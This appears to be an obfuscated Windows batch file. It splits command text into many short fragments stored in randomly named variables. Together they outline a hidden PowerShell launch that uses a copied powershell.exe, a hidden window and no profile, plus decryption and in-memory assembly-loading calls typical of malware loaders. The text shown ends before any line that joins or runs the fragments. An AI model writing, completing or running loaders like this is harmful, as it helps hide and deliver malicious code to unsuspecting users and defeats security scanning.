@echo off
set "lRWXecogcM=ws"
set "wuyXVneKhH=32"
set "xlpXdksjwk= C"
set "SxeYQmDyxv=rS"
set "tuHVfwfWRw=py"
set "kKHVAsYKQB=co"
set "vMJDycyoyP=Sy"
set "eQIpMhOFzS=Wi"
set "HtQGxcPAto=ll"
set "giQoahULKG=we"
set "FVNUbOlnnX=.e"
set "MORxjZuKSq=nd"
set "EvAsMiMZvb=\W"
set "ZjcvEQmDZg=we"
set "UyOANsupyn=he"
set "NEnxRvCrxL= /"
set "XZPgrHCalV=s\"
set "RqLIOuzfgL=:\"
set "MIRRVHFCwu=rs"
set "sieEzzHxBN=0\"
set "dNiWsFqpUw=do"
set "siTVMdyezv=he"
set "xcfjFIbYbj=po"
set "ZapexXYWzo=Po"
set "ZOmQKqCdEJ=st"
set "aOoFKdJZhL=ow"
set "uzzeVQpgJB=1."
set "PqfzujrQEr=ll"
set "xOyOVMZLfC=em"
set "qOYePZLUyY=y "
set "PKgVUCWqnk=\v"
set "ezvCxGoVIL=in"
set "czCGoItqAI=xe"
set "jNuWxWeBXi=cd"
set "MdGsPzXbYC= %~dp0"
set "EUSOuFNwqw=[Sys"
set "CAWySiVIrf=orF'"
set "qjwiXAHzJO=tem."
set "bpSNuVjqDg=-joi"
set "YtcdZXQXOE=stem"
set "bBGgzFgUKF=, $D"
set "ONSEFEuxVJ=.Ass"
set "yjZoBZKOhD=morF"
set "nIucIxfrZU=mory"
set "UIdOzrTmmE=)) {"
set "cLjNWsJYIa=KhdF"
set "YaWPAHfEXD===')"
set "gXjEdcwkxA=ct S"
set "PEOIeZEOBr=onve"
set "GcJEYMcHvq=Mc.T"
set "Iiigknxnuo=[Sys"
set "KtLHpvQHlt=ionM"
set "TEpgjcjSDi=tem."
set "znexzvGGLE=();$"
set "MGbjRIryKi=ach "
set "epuBijxjIU=DNJS"
set "LEosemLYwG=Vz);"
set "kFtmPEeGtA=pStr"
set "OOGzEqVbWz=;$CZ"
set "RQSRxHmhPf=R5jf"
set "xmjDreQYzc=.Len"
set "LGjcfWEGyU=ptog"
set "hDJfPAfzZc=$fgb"
set "ZoPXKQdlkg=)($m"
set "JXXWsaMqfC=zm83"
set "YGaqGaieiH=nage"
set "LarfoKHRgK=[Sys"
set "onLqjyFdXD=pose"
set "UlICUeEoor=.Cop"
set "BmluFytOAd=$dBz"
set "gYZGDHepZS=DhEV"
set "JcjpbUngmS=ITH."
set "TggwhSECge=('da"
set "kSefYeTlEg=KhdF"
set "vcTGsjGpcz=; };"
set "yZXsZqkNsB=$VRK"
set "kaskGaMILg=;$RK"
set "FdPMXoxKRB=$ZKh"
set "rcRoNqvlYD=-nop"
set "gmllDSqCfZ=KhdF"
set "lyJlkRVBow=se()"
set "ALhjfzylEv=6esa"
set "XzMhQsizNo=Mode"
set "ayqXPigXyS=ddin"
set "ltbkNejqhx=ss -"
